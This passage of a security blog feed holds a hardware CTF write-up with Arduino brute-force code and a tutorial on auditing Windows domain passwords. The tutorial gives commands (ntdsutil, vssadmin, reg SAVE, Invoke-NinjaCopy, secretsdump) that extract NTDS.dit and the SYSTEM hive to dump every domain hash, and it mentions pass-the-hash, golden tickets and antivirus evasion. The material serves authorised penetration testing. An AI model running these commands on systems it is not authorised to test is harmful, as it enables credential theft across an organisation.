17-02-2022 Developers pushed patch to FreeTAKServer v1.9.9&lt;br /&gt;
11-03-2022 Assigned CVEs&lt;/p&gt;

&lt;h2 id=&quot;resources&quot;&gt;Resources&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;FreeTAKServer : https://github.com/FreeTAKTeam/FreeTakServer&lt;/li&gt;
  &lt;li&gt;FreeTAKServer-UI : https://github.com/FreeTAKTeam/UI&lt;/li&gt;
  &lt;li&gt;Flask-Unsign : https://github.com/Paradoxis/Flask-Unsign&lt;/li&gt;
  &lt;li&gt;Curl : https://curl.se/&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Christoffer Claesson</name></author><category term="pentest" /><category term="security" /><summary type="html">The parrot is not dead, its RESTing</summary></entry><entry><title type="html">Reverse Engineering an unknown digital protocol: RHME2, Whac a mole</title><link href="/reverse-engineering-an-unknown-digital-protocol" rel="alternate" type="text/html" title="Reverse Engineering an unknown digital protocol: RHME2, Whac a mole" /><published>2021-05-18T00:00:00+00:00</published><updated>2021-05-18T00:00:00+00:00</updated><id>/reverse-engineering-an-unknown-digital-protocol</id><content type="html" xml:base="/reverse-engineering-an-unknown-digital-protocol">&lt;blockquote&gt;
  &lt;p&gt;Who doesn’t like a classic game of whac-the-mole? This time the moles infiltrated deep into the backyard of a poor farmer’s family. The moles are ruining the crops, which the farmer desperately needs to provide for his wife and 2 children. Any traveler able to help him by extinguishing the darn things will be greatly rewarded. Are you up for the task?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So I wanted to do some more hardware based CTF, especially now in covid times I don’t get out as much to client sites doing some of these things on site. So I picked up yet another Riscure RHME2 CTF binary and tossed it into one of my Arduino Nano boards to have a go at it! This time I’ll tackle the challenge Whack a Mole (links are down below) which is a (at the time of writing) 5 year old challenge, but it’s been on my todo list for a while.&lt;/p&gt;

&lt;h2 id=&quot;setup&quot;&gt;Setup&lt;/h2&gt;
&lt;p&gt;So the Bill of Materials needed are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;2x Arduino Nano&lt;/li&gt;
  &lt;li&gt;Breadboard&lt;/li&gt;
  &lt;li&gt;Various cables for the breadboard&lt;/li&gt;
  &lt;li&gt;Digital Oscilloscope with at least one channel (I used a Rigol DS1054Z)&lt;/li&gt;
  &lt;li&gt;Optional: Logic Analyzer&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Lets kick things off by actually loading the binary onto our target arduino. The writing of the binary will be done by using avrdude, which is available in most package repos.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@linux:~# wget https://github.com/Riscure/Rhme-2016/raw/master/challenges/binaries/whac_the_mole/whac_the_mole.hex
root@linux:~# avrdude -c arduino -p atmega328p -p /dev/&amp;lt;NANO Device&amp;gt; -b115200 -u -V -U flash:w:whac_the_mole.hex
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Doing that should produce a successful flash of the device with the correct binary. The next step is to power up the board and check if there’s any data on the serial connection. But to do that we also need to find the baudrate of the device, which can be done by either trying and getting lucky, or using the oscilloscope to measure the peaks and data rate that is sent. But before actually hooking up the scope to the circuit,I highly recommend looking through EEVblogs guide on “&lt;a href=&quot;https://www.youtube.com/watch?v=xaELqAo4kkQ&quot;&gt;How NOT to blow up your oscilloscope&lt;/a&gt;”, first and last warning!&lt;/p&gt;

&lt;p&gt;So just to give the low down on serial communication. Devices communicate over a serial connection to other devices, it does so in binary representation by managing Peaks and Valleys on a digital connection. The Digital connection have two states:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;+5/3.3v represent a 0&lt;/li&gt;
  &lt;li&gt;+/-0v represent a 1&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;That means when hooking up a oscilloscope to a serial connection, we’ll see a natural +5v baseline on the screen. It also means that when we are triggering the probe in order to pause the data on the screen, we need to trigger on a downward slope. So hooking up the scope to the target Tx pin (Nano Pin0), setting the trigger to a -2.5v downward slope on the correct probe and resetting the arduino board we get presented with a fixed image of a serial transmission. Looking at the oscilloscopes automagic measurements, it’s quite easy to determine a Rate of 192kV/s, so a baudrate of 19200 will work perfectly. Another great feature of the DS1054Z and many other digital oscilloscopes is that it can do RS232 decode directly in the device. Plugging in the known baudate to the Decode function outputs some of the sent strings.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2021/05/reverse-engineering-an-unknown-digital-protocol/RS232_Decode.png&quot; alt=&quot;Oscilloscope Serial Decoding&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;first-connection&quot;&gt;First Connection&lt;/h2&gt;

&lt;p&gt;Having that knowledge that we have the correct baudrate, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;screen /dev/&amp;lt;NANO Target&amp;gt; 19200&lt;/code&gt; or whichever fancy serial program that’s available. Once connected we get presented by the following screen:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@linux:~# screen /dev/ttyUSB0 19200
Welcome adventurer.

We are glad you are here. We are in dire need of assistance.
A huge family of moles have found their way into our yard.
We need you to get rid of all 20 of them.
If you manage to extinguish them all we will greatly reward you.
When you are ready, please step into the yard by pressing &amp;lt;Enter&amp;gt;

Ready?
Get set!
GO!
You missed it. Try again by pressing &amp;lt;Enter&amp;gt;.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Pressing enter at the screen just gives the following message over and over again, and the program does not seem to accepts characters or and form of input over the Serial connection. So it is time to start exploring other options!&lt;/p&gt;

&lt;p&gt;The name of the challenge, refer to the physical game of Whack the mole! which is a carnival game where heads pop up through holes, and the objective is to hit those in order to score points. Ok so that’s easy enough if you’d know where to hit the moles.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2021/05/reverse-engineering-an-unknown-digital-protocol/Arduino-Nano-pinout.png&quot; alt=&quot;Arduino Nano pinout schematic from http://lab.dejaworks.com/arduino-nano-pinouts/&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the schematics of the Arduino Nano, we can identify that there are a bunch of digital pins. 0/1 are dedicated to Tx and Rx for the Serial, 2-13 are dedicated Digital pins, and 14-19 are analog pins. Lets hook up a Logic Analyzer to the digital pins in order to see if there’s any other signals.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2021/05/reverse-engineering-an-unknown-digital-protocol/Lab-desktop-saleae.jpg&quot; alt=&quot;Saleae Logic Setup&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hooking up the Saleae Logic to the 2-8 pins gave no results after pressing enter on the Serial Prompt, but taking the next set of pins 9-13 and A0-A2 resulted in some traffic on the yellow cable, Channel 4, which was connected to the pin D13.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2021/05/reverse-engineering-an-unknown-digital-protocol/Logic_analyzer_software.png&quot; alt=&quot;Logic Software result&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;making-some-assumptions&quot;&gt;Making some assumptions&lt;/h2&gt;
&lt;p&gt;While further investigating the board and signals, I went in with a couple assumptions&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The Signals on pin D13, reflected the pin to hit&lt;/li&gt;
  &lt;li&gt;The pin should be one of the other Digital pins 2-12&lt;/li&gt;
  &lt;li&gt;There are multiple levels and not just one hit that has to be made&lt;/li&gt;
  &lt;li&gt;The signal should be received within 100ms from the peak&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;While I was successful in making one or two hits and manually mapping out the pins that needed to be hit, each time that the board target resets the pins changed. Which pushed me in the direction of needing to do some proper logic on the micro controller in order to automate the process as much as possible.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2021/05/reverse-engineering-an-unknown-digital-protocol/Multiple_hits.png&quot; alt=&quot;Registering multiple mole whacks using the oscilloscope&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;codesplaining&quot;&gt;Codesplaining&lt;/h2&gt;
&lt;p&gt;In order to successfully automate the process of retrieving the flag there are some code requirements:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Be able to bruteforce multiple pins&lt;/li&gt;
  &lt;li&gt;The amount of observable peaks are between 1-6&lt;/li&gt;
  &lt;li&gt;Automated process of verifying and resetting the board&lt;/li&gt;
  &lt;li&gt;The time to hit should be ~100ms&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So in order to solve the resetting and verifying problem, I relied on using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SoftwareSerial.h&lt;/code&gt; library, as that can create a Software emulated Serial Tx/Rx out of any other pin. The idea was to interpret the messages that the target board was echoing depending if you hit a mole or not. Where the different states are:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;You whacked it &amp;gt; Success&lt;/li&gt;
  &lt;li&gt;You missed it &amp;gt; fFail&lt;/li&gt;
  &lt;li&gt;Welcome &amp;gt; Start of the game&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With that set, came the problem of number 1, to bruteforce the pins. We know from the research that there are pins 2-12 as input on the target board to hit, and there are a maximum of 6 peaks on each iteration.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int candidates[6] = {2, 2, 2, 2, 2, 2};
int pins[6] = {0, 0, 0, 0, 0, 0};

void peak(int pin){
    digitalWrite(pin, HIGH);
    delay(PEAKDELAY);
    digitalWrite(pin, LOW);
  }

void whack(int pin){
    digitalWrite(PIN_MONITOR, HIGH);
    if (pins[pin] != 0) {
      peak(pins[pin]);
    } else {
      peak(candidates[pin]);
    }
    digitalWrite(PIN_MONITOR, LOW);
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The bruteforce function simply checks the amount of peaks that are registered on the input D13 pin, which corresponds to the array &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pins[n]&lt;/code&gt;. If the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pin[peak] is 0&lt;/code&gt; try the pin in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;candidates[peak]&lt;/code&gt; in this case, it starts by sending a peak out on pin D2. If the hit missed, the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;miss()&lt;/code&gt; will increase &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;candidates[peak]&lt;/code&gt; with one, so that the next time the program registers the same peak it will try pin D3. If however the peak would be a hit, the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hit()&lt;/code&gt; will be called and register pin D2 into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pins[n]&lt;/code&gt; table to be remembered for the future identical number of peaks.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2021/05/reverse-engineering-an-unknown-digital-protocol/bruteforce.png&quot; alt=&quot;Console of the microcontroller which is performing the bruteforce&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Running the code should eventually bruteforce each pin position, and print the flag in your terminal connected to the target!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2021/05/reverse-engineering-an-unknown-digital-protocol/flag.png&quot; alt=&quot;Successful bruteforce of the pin positions for the flag on the target Nano&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;source-code&quot;&gt;Source Code&lt;/h3&gt;
&lt;p&gt;Putting all the code together should look something like:
    #include &lt;SoftwareSerial.h&gt;&lt;/SoftwareSerial.h&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define MAXPINS 12
#define PEAKDELAY 30
#define BAUDRATE 19200
#define SER_TX 18
#define SER_RX 19
#define PIN_READ 13
#define PIN_MONITOR 14

int state = 0;
int peak_count;
int peak_state;
int top_level = 1;
int current_level = 1;

char inData;
String strBuf;
String str;
unsigned long peak_start = 0;

String pins_used[12] = {&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;};
int candidates[6] = {2, 2, 2, 2, 2, 2};
int pins[6] = {0, 0, 0, 0, 0, 0};

SoftwareSerial target(SER_RX, SER_TX);

void setup() {
  Serial.begin(BAUDRATE);

  pinMode(PIN_READ, INPUT);
  pinMode(PIN_MONITOR, OUTPUT);
  digitalWrite(PIN_MONITOR, LOW);

  for (int i=2;i&amp;lt;MAXPINS+1;i++){
    pinMode(i, OUTPUT);
    digitalWrite(i, LOW);
    }

  Serial.println(&quot;Ready&quot;);
  target.begin(19200);
}

void set_used_pins(int pin){
  if (pins_used[pin-1] == &quot;[ ]&quot;)
    pins_used[pin-1] = &quot;[*]&quot;;
  }

void print_status(){
  for (int i=0;i&amp;lt;2;i++) Serial.println(&quot;\r&quot;);  
  Serial.print(&quot;Used Pins: &quot;);
  for (int i=0;i&amp;lt;12;i++){
    Serial.print(pins_used[i]);
    Serial.print(&quot; &quot;);
  }
  Serial.println(&quot;\r&quot;);
  Serial.println(&quot;------------------&quot;);
  Serial.print(&quot;Peaks: 1 2 3 4 5 6  &quot;);
  Serial.print(&quot;| Level: &quot;);
  Serial.println(current_level);
  Serial.print(&quot;Pins : &quot;);

  for (int i=0;i&amp;lt;6;i++){
    Serial.print(pins[i]);
    Serial.print(&quot; &quot;);
    }

  Serial.print(&quot; | Top: &quot;);
  Serial.print(top_level);
  Serial.println(&quot;/50&quot;);
}

void peak(int pin){
    digitalWrite(pin, HIGH);
    delay(PEAKDELAY);
    digitalWrite(pin, LOW);
  }

void whack(int pin){
    digitalWrite(PIN_MONITOR, HIGH);
    if (pins[pin] != 0) {
      peak(pins[pin]);
    } else {
      peak(candidates[pin]);
    }
    digitalWrite(PIN_MONITOR, LOW);
  }

void hit(){
    if (pins[peak_state] == 0){
        int candidate = candidates[peak_state];
        set_used_pins(candidate);
        pins[peak_state] = candidate;
      }
    print_status();
    current_level++;
    if (current_level &amp;gt; top_level)
      top_level++;
  }

void miss(){
    candidates[peak_state] = candidates[peak_state] + 1;

    if (candidates[peak_state] &amp;gt; 12){
      Serial.println(&quot;INVALID PIN.... Resetting to 2&quot;);
      candidates[peak_state] = 2;
    }

    print_status();
    current_level = 0;
  }

void loop() {
  while(target.available()){
    inData = target.read();
    strBuf += inData;
    }

  if (strBuf.endsWith(F(&quot;\n&quot;))){
    strBuf.trim();
    if (strBuf.length() &amp;gt; 0) { str = strBuf; }
    strBuf = &quot;&quot;;
    }

  if (str.indexOf(F(&quot;missed&quot;)) &amp;gt;= 0) {
    miss();
    str = &quot;&quot;;
    target.write(&quot;\r&quot;);

  } else if (str.indexOf(F(&quot;whacked&quot;)) &amp;gt;= 0) {
    hit();
    str = &quot;&quot;;     

  } else if (str.indexOf(F(&quot;When you are ready&quot;)) &amp;gt;= 0) {
    Serial.println(&quot;Start the game&quot;);
    delay(500);
    print_status();
    str = &quot;&quot;;
    target.write(&quot;\r&quot;);
  }

  int value = digitalRead(PIN_READ);
  if (value != state){
    state = value;
    if (state == 1){
      peak_start = millis();
      peak_count++;
      }
    }

  if (state == 0 &amp;amp;&amp;amp; peak_start &amp;amp;&amp;amp; peak_start + 100 &amp;lt; millis()){
    peak_state = peak_count - 1;
    whack(peak_state);
    peak_start = 0;
    peak_count = 0;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;resources&quot;&gt;Resources&lt;/h3&gt;
&lt;p&gt;The complete source code and fritzing scheme can be found at:&lt;br /&gt;
Fritzing - &lt;a href=&quot;https://blog.securitybits.io/assets/files/2021/05/reverse-engineering-an-unknown-digital-protocol/scheme.fzz&quot;&gt;scheme.fzz&lt;/a&gt;&lt;br /&gt;
Arduino Sketch - &lt;a href=&quot;https://blog.securitybits.io/assets/files/2021/05/reverse-engineering-an-unknown-digital-protocol/whacker.ino&quot;&gt;whacker.ino&lt;/a&gt;&lt;/p&gt;</content><author><name>Christoffer Claesson</name></author><category term="hardware" /><category term="ctf" /><category term="security" /><summary type="html">Who doesn’t like a classic game of whac-the-mole? This time the moles infiltrated deep into the backyard of a poor farmer’s family. The moles are ruining the crops, which the farmer desperately needs to provide for his wife and 2 children. Any traveler able to help him by extinguishing the darn things will be greatly rewarded. Are you up for the task?</summary></entry><entry><title type="html">Password audits</title><link href="/password-audit" rel="alternate" type="text/html" title="Password audits" /><published>2020-06-02T00:00:00+00:00</published><updated>2020-06-02T00:00:00+00:00</updated><id>/password-audit</id><content type="html" xml:base="/password-audit">&lt;blockquote&gt;
  &lt;p&gt;This is be a brief overview on why and how to perform a password audit on a windows domain.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In this post we are going to explore some of the attacks/audits that can be performed on the Active Directory credential database. In order to be able to extract the hashes to crack, we need to acquire the NTDS.dit file in one way or another. The NTDS.dit is a database which stores the data and information about user objects, groups and group memberships. It also includes the LM (if configured) and the NTLM hashes for all users. A password audit should be performed on a regular basis, in order to ensure that a correct security level is upheld. So that there does not exist any kind fo weak or easily guessable passwords, eg. Winter2020, &lt;companyname&gt;2017 etc. It is also useful during penetration tests and red team operations to acquire the hashes and clear text passwords, in case there is domain trust between two domains with shared credentials, or to forge golden tickets.&lt;/companyname&gt;&lt;/p&gt;

&lt;p&gt;While extracting the hashes makes it possible to use tools such as mimikatz, psexec or smbclient to pass the hash, we will in this post focus on getting to a state to audit the hashes (read cracking) using &lt;a href=&quot;https://hashcat.net/hashcat/&quot;&gt;hashcat&lt;/a&gt; or the LM/NTLM offline cracker of your choice.&lt;/p&gt;

&lt;p&gt;The premise of these audits is that the administrator have access to a user with the correct rights to the Domain Controller, either by having Domain Administrative rights, or the ACL GetChangesAll for the domain or Domain Controller object. The examples below will utilize Domain Administrative credentials for simplicity’s sake.&lt;br /&gt;
In order to create a successful dump to audit, we need two specific files:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;NTDS.dit&lt;/strong&gt; - The database itself, which depending on the size of the domain can be a few Megabytes to several Gigabytes.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SYSTEM Hive&lt;/strong&gt; - Registry hive which contains the bootkey used to decrypt the NTDS.dit file.&lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;p&gt;These files that are being created do contain all the domain controllers sensitive data, please ensure that they are stored  and handled properly according to your organizations security policy.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;ntdsutil&quot;&gt;NTDSUtil&lt;/h3&gt;
&lt;p&gt;NTDSUtil is a builtin tool in every windows server with the domain controller role since Windows Server 2003, and is built to manage the domain from the command line. This is also one of the easier ways to export the database.&lt;br /&gt;
Start by opening a powershell prompt as admin, and create a suitable folder to extract to.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\Windows\system32&amp;gt; cd ..\..
PS C:\&amp;gt; mkdir passwordAudit
PS C:\&amp;gt; cd .\passwordAudit\
PS C:\passwordAudit&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After its a few simple commands in order to export the database, SYSTEM and SECURITY hives, from a running domain controller.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\passwordAudit&amp;gt; ntdsutil
ntdsutil.exe: activate instance ntds
ntdsutil.exe: ifm
ifm: create full c:\passwordAudit
ifm: quit
ntdsutil.exe: quit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This command uses the same underlying technique as VSSAdmin (See below), but does so without the need of any extra VBS script or process injection.&lt;br /&gt;
&lt;img src=&quot;assets/images/posts/2020/06/password-audit/ntdsutil-screenshot.png&quot; alt=&quot;NTDSUtil export&quot; /&gt;&lt;br /&gt;
Transfer these files to a host that has Impacket Secretsdump installed and jump to that section (Secretsdump &amp;gt; From NTDS.dit).&lt;/p&gt;

&lt;h3 id=&quot;vssadmin&quot;&gt;VSSAdmin&lt;/h3&gt;
&lt;p&gt;Now if you don’t like automation, and love to do things manually… look no further! Just beware that running the following commands might trigger some alerts if there is any kind of monitoring of the domain controller, as some ransomware strains utilize VSSAdmin for malicious purposes.&lt;br /&gt;
Again create a working folder to put the exported database in and change o that directory (take note that we are using the command prompt and not powershell).&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Windows\system32&amp;gt; cd c:\
C:\&amp;gt; mkdir passwordAudit
C:\&amp;gt; cd .\passwordAudit\
C:\passwordAudit&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The steps that we are taking are:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Creating a volume Shadow Copy.&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\&amp;gt; vssadmin create shadow /for=C:&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Manually copying the NTDS.dit file to the working directory from the Shadow Copy.&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\&amp;gt; copy &amp;lt;Shadow Copy Volume Name&amp;gt;\windows\ntds\ntds.dit c:\passwordAudit\ntds.dit&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Copy the System file.&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\&amp;gt; reg SAVE HKLM\SYSTEM C:\passwordAudit\SYSTEM&lt;/code&gt;&lt;br /&gt;
or&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy &amp;lt;Shadow Copy Volume Name&amp;gt;\windows\system32\config\SYSTEM c:\passwordAudit\SYSTEM&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Deleting the Shadow Copy.&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\&amp;gt; vssadmin delete shadows /shadow=&amp;lt;Shadow Copy ID&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This approach is a bit more involving then using the NTDSUtil, but achieves the same results.&lt;br /&gt;
&lt;img src=&quot;assets/images/posts/2020/06/password-audit/vssadmin-screenshot.png&quot; alt=&quot;VSSAdmin export&quot; /&gt;&lt;br /&gt;
There is also the possibility to in case the user is not allowed to create shadow copies, to list available Shadow Volumes to perform copies from. They are usually named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HarddiskVolumeShadowCopy#&lt;/code&gt; where # is denoted by a number, pick the highest number in order to get the latest Shadow Copy.&lt;br /&gt;
&lt;img src=&quot;assets/images/posts/2020/06/password-audit/vssadmin-list-shadows.png&quot; alt=&quot;VSSAdmin list shadows&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;powersploits-ninjacopy&quot;&gt;Powersploits Ninjacopy&lt;/h3&gt;
&lt;p&gt;Now its not really a Hacking blog/article if you don’t mention at least something related to Powersploit once in a while (More dedicated posts are coming though).&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;This is not recommended for production systems as we are basically going to run unsanitized Powershell code from GitHub. I know better, You know better… But sometimes its &lt;a href=&quot;https://medium.com/@notdan/curl-slight-of-hand-exploit-hysteria-29a82e5851d&quot;&gt;hilarious&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So lets create a working directory and have a powershell prompt with administrative privileges ready!&lt;/p&gt;

&lt;p&gt;For this export we are taking the following steps:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Download &lt;strong&gt;Invoke-NinjaCopy.ps1&lt;/strong&gt; from &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit&quot;&gt;PowerShellMafia&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Import Invoke-Ninjacopy.ps1 as a module in a Powershell&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PS C:\&amp;gt; Import-Module .\Invoke-NinjaCopy.ps1&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Run Invoke-NinjaCopy module to export the NTDS.dit&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PS C:\&amp;gt; Invoke-NinjaCopy -path c:\Windows\NTDS\ntds.dit -verbose -localdestination &amp;lt;Destination&amp;gt;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Copy the System file.&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\&amp;gt; reg SAVE HKLM\SYSTEM C:\passwordAudit\SYSTEM&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Yeah my Antivirus screamed too! Lucky for us, there are some bypasses and recommendations for getting around that (Later date).&lt;br /&gt;
&lt;img src=&quot;assets/images/posts/2020/06/password-audit/Invoke-NinjaCopy-screenshot.png&quot; alt=&quot;Invoke-Ninja export&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;secretsdump&quot;&gt;Secretsdump&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;The following hashes are you more then encouraged to crack, it is not a production system or something that is currently in use for other then this lab.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Secretdump from Impacket are one of those tried and true tools that work by doing a Domain Controller Sync, to extract the hashes from a remote system, without the need to move large database files. You can either run it directly from a bash terminal where it is installed, against the domain controller. Or take one of the other techniques shown above and run secretsdump against a local file.&lt;/p&gt;
&lt;h4 id=&quot;from-domain-controller&quot;&gt;From Domain Controller&lt;/h4&gt;
&lt;p&gt;Lets start with the remote export.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Download and install Impacket according to the wiki: &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;GitHub&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Use the following syntax:&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root@kali:~# secretsump.py &amp;lt;DOMAIN&amp;gt;/&amp;lt;DomainAdmin&amp;gt;@&amp;lt;DomainController&amp;gt;&lt;/code&gt;&lt;br /&gt;
Add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-dc-ip &amp;lt;DomainController&amp;gt;&lt;/code&gt; if running through ProxyChains.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This will give a nicely formatted already crackable list of LM and NTLM hashes which are ready to be thrown into Hashcat or JohnTheRipper.&lt;br /&gt;
&lt;img src=&quot;assets/images/posts/2020/06/password-audit/secretsdump-remote-screenshot.png&quot; alt=&quot;Secretsdump Remote Export&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;from-ntdsdit&quot;&gt;From NTDS.dit&lt;/h4&gt;
&lt;p&gt;Once we have used any of the above techniques to extract the raw &lt;strong&gt;NTDS.dit&lt;/strong&gt; and &lt;strong&gt;SYSTEM hive&lt;/strong&gt;, we can use secretsdump in order to extract the raw hashes from the database. &lt;br /&gt;
Use the following commands:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Transfer the files to a secure server and install Impacket according to the wiki: &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;GitHub&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Move the files to a working directory in my case /opt/passwordAudit&lt;/li&gt;
  &lt;li&gt;Extract the hashes using following syntax:&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root@kali:/opt/passwordAudit# secretsdump.py -system &amp;lt;SYSTEM FILE&amp;gt; -ntds &amp;lt;NTDS.dit File&amp;gt; LOCAL&lt;/code&gt;&lt;br /&gt;
Save to a file by appending the parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-outputfile &amp;lt;FILE&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2020/06/password-audit/secretsdump-local-screenshot.png&quot; alt=&quot;Secretsdump Local Export&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thank you for reading this rather lengthy post, Especially if you also tried each technique (On your own domain controller with permission of course). I will keep coming back to this one and add new techniques as i find/learn them so remember to re-visit once in a while!&lt;/p&gt;</content><author><name>Christoffer Claesson</name></author><category term="security" /><category term="redteam" /><summary type="html">This is be a brief overview on why and how to perform a password audit on a windows domain.</summary></entry><entry><title type="html">What Virtual Machines Am I Running?</title><link href="/what-virtual-machines-am-i-running" rel="alternate" type="text/html" title="What Virtual Machines Am I Running?" /><published>2020-05-17T00:00:00+00:00</published><updated>2020-05-17T00:00:00+00:00</updated><id>/what-virtual-machines-am-i-running</id><content type="html" xml:base="/what-virtual-machines-am-i-running">&lt;blockquote&gt;
